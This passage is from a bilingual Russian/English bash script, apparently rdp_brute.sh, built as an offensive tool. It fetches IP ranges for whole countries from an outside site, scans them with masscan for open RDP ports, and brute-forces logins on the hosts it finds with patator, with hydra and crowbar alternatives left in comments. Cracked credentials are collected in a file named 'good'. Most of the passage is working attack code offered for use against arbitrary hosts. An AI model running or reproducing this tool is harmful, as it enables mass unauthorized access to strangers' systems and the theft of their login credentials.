masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "202" ]; then
curl http://ipdiapazon.16mb.com/Yemen.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "203" ]; then
curl http://ipdiapazon.16mb.com/Zambia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "204" ]; then
curl http://ipdiapazon.16mb.com/Zimbabwe.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green*The IP range is saved in the file $red $PWD/list. $colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




echo ""

MAINBRUTEMENUEN

if [ "$menuoption" = "5" ]; then

CLEARALL
exit;
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
}

########################################################################################


#####################################MAINBRUTEMENURU##################################
MAINBRUTEMENURU ()
{
echo ""
echo -e "$green                                         Выбрать метод перебора..$colorbase"
echo -e "                +-----------------------------------------------------------------------+"
echo -e "                |        $grey 1.$yellow Ввести 1 логин и указать путь к файлу с паролями.$colorbase          |"; 
echo -e "                |        $grey 2.$yellow Указать путь к файлу с логинами и ввести 1 пароль.$colorbase         |";
echo -e "                |        $grey 3.$yellow Указать путь к файлам с логинами и паролями.$colorbase               |";
echo -e "                |        $grey 4.$yellow Приступить к перебору методом по умолчанию.$colorbase                |";
echo -e "                |        $grey 5.$yellow Перейти в Главное меню.$colorbase                                    |";
echo -e "                |        $red         Нажмите $aquamarine[Enter]$red для выхода из скрипта$colorbase                 |"
echo -e "                +-----------------------------------------------------------------------+"
read -p "                                             Выбор из меню : " brutmenu

if [ "$brutmenu" = "1" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTMENU1 (){
read -p "*Введите логин {administrator, admin & etc.} : " loginbrute
read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
}
while BRUTMENU1
do
if [[ -z $loginbrute || ! -s $passlist ]]; then
echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями$green"
else
break
echo ""
fi
done


clear
echo -e "                                            $green Запуск брутфорса"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"


echo ""

python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1  0=open3389 1=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTRU
./rdp_brute.sh
exit;
./rdp_brute.sh
fi


if [ "$brutmenu" = "2" ]; then
echo -e "$aquamarine***************************************************************************************************$green"
BRUTMENU2 (){
read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
}
while BRUTMENU2
do
if [[ -z $passbrute || ! -s $loginlist ]]; then
echo -e "\n$red***ОШИБКА! Неверно указан пароль или файл с логинами$green"
else
break
echo ""
fi 
done

clear
echo -e "                                            $green Запуск брутфорса"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=$passbrute 0=open3389 1=users -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
#hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTRU
./rdp_brute.sh
exit;
./rdp_brute.sh
fi

if [ "$brutmenu" = "3" ]; then
echo -e "$aquamarine****************************************************************************************************$green"
BRUTEMENU3 () {
read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
}
while BRUTEMENU3
do
if [[ ! -s $passlist || ! -s $loginlist ]]; then
echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или с паролями$green"
else
break
echo ""
fi
done

clear
echo -e "                                            $green Запуск брутфорса"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=FILE2  0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
#hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTRU
echo -e "$red Файл с целями пустой$colorbase"
sleep 2
./rdp_brute.sh
exit;
./rdp_brute.sh
fi


if [ "$brutmenu" = "4" ]; then

clear
echo -e "                                            $green Запуск брутфорса"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass 3=$port -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -U $PWD/users  -C $PWD/dict/pass -S $PWD/open 
#hydra -L $PWD/users -P $PWD/dict/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

echo ""
clear
TESTRESULTRU
./rdp_brute.sh
exit;
./rdp_brute.sh
fi

if [ "$brutmenu" = "5" ]; then
echo ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
}
######################################################################################
#####################################MAINBRUTEMENUEN##################################
MAINBRUTEMENUEN ()
{
echo ""
echo -e "$green                                                Select method$colorbase"
echo -e "                 +-----------------------------------------------------------------------+"
echo -e "                 |    $grey 1.$yellow Enter the login and enter the path to passwords dictionary$colorbase     |"; 
echo -e "                 |    $grey 2.$yellow Enter the path to logins dictionary and enter the password$colorbase     |";
echo -e "                 |    $grey 3.$yellow Enter the path to dictionaries with logins and  passwords$colorbase      |";
echo -e "                 |    $grey 4.$yellow Proceed to the brute force method by default$colorbase                   |";
echo -e "                 |    $grey 5.$yellow Return to Main menu$colorbase                                            |";
echo -e "                 |                        $red Press $aquamarine[Enter]$red to exit$colorbase                         |";
echo -e "                 +-----------------------------------------------------------------------+"
read -p "                                             Сhoose from a menu : " brutmenu

if [ "$brutmenu" = "1" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTMENUEN1 () {
read -p "*Enter username {administrator, admin & etc.} : " loginbrute
read -p "*Enter the path to the file with a list of passwords {dict/john}: " passlist
}
while BRUTMENUEN1
do
if [[ -z $loginbrute || ! -s $passlist ]]; then
echo -e "\n$red***ERROR! Incorrect login or password file$green"
else
break
echo ""
fi
done

clear
echo -e "                                          $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "

echo ""

python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
./rdp_brute.sh
exit;
./rdp_brute.sh
fi


if [ "$brutmenu" = "2" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTEMENUEN2 () {
read -p "*Enter the path to username dictionary {dict/users}: " loginlist
read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
}
while BRUTEMENUEN2
do
if [[ ! -s $loginlist || -z $passbrute ]];
then
echo -e "\n$red***ERROR! Incorrect file with login and password unknown$green"
else
break
echo ""
fi
done

clear
echo -e "                                           $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=$passbrute 0=open3389 1=users -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
./rdp_brute.sh
exit;
./rdp_brute.sh
fi


if [ "$brutmenu" = "3" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTEMENU3 () {
read -p "*Enter the path to username dictionary {dict/users}: " loginlist
read -p "*Enter the path to passwords dictionary {dict/john}: " passlist
}
while BRUTEMENU3
do
if [[ ! -s $loginlist || ! -s $passlist ]]; then
echo -e "\n$red***ERROR! Incorrect file with logins and passwords file$green"
else
break
echo ""
fi
done

clear
echo -e "                                           $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
./rdp_brute.sh
exit;
./rdp_brute.sh
fi

if [ "$brutmenu" = "4" ]; then
clear
echo -e "                                           $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 port=$port password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=600-654 -l $PWD/Results
#python crowbar.py -b rdp -U $PWD/users -C $PWD/dict/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -L $PWD/users -P $PWD/dict/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
echo -e "\n$red***ERROR! File for targets is empty "
echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase"
read -p ""

./rdp_brute.sh
fi

if [ "$brutmenu" = "5" ]; then
echo ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
}

######################################TESTRESULTRU#######################################
TESTRESULTRU ()
{
clear
cat $PWD/Results/RUNTIME.log |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' > all_results
if [ -s all_results ]
	then
	#clear
	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' >> good
	cat all_results
	echo ""
 echo -e "$colorbase                                       +---------------------------+"
 echo -e "$colorbase                                       |$red   Логин/Пароль найден!    $colorbase|";
 echo -e           "                                       +---------------------------+$red"
	echo ""
	echo -e "$yellow*Логин/Пароль записаны в файл $red $PWD/good"
	echo ""
	echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh	
	else
 echo -e "$colorbase                                       +---------------------------+"
 echo -e "$colorbase                                       |$red Логин/Пароль не найден :( $colorbase|";
 echo -e           "                                       +---------------------------+$red"
 
 echo -e ""
 echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi	
}
########################################################################################
######################################TESTRESULTEN######################################
TESTRESULTEN ()
{
clear
cat $PWD/Results/RUNTIME.log |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' > all_results
if [ -s all_results ]
	then
	#clear
	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' >> good
        cat all_results
 echo -e "$colorbase                          +-------------------------+"
 echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
 echo -e           "                          +-------------------------+$red"
 echo -e ""
 echo -e "$yellow*Login/Password written to the file $red $PWD/good$colorbase"
 echo -e ""
 echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
	else
 echo -e "$colorbase                                      +-----------------------------+"
 echo -e "$colorbase                                      |$red Login/Password not found :( $colorbase|";
 echo -e           "                                      +-----------------------------+$red"
 echo -e ""
 echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi	
}
#######################################CHECKFILERU######################################
CHECKFILERU ()
{
if [ -s open3389 ]
	then
 echo ""
	else
 echo -e "$colorbase                                       +-------------------------+"
 echo -e "$colorbase                                       |$red Открытых RDP не найдено $colorbase|";
 echo -e           "                                       +-------------------------+$red"
 echo -e ""
 echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
}
########################################################################################

#######################################CHECKFILEEN######################################
CHECKFILEEN ()
{
if [ -s open3389 ]
	then
 echo ""
	else
 echo -e "$colorbase                                        +-------------------------+"
 echo -e "$colorbase                                        |$red    Open Rdp not found $colorbase  |";
 echo -e           "                                        +-------------------------+$red"
 echo -e ""
echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
}
#####################################################################################
CHECKLANGUAGE
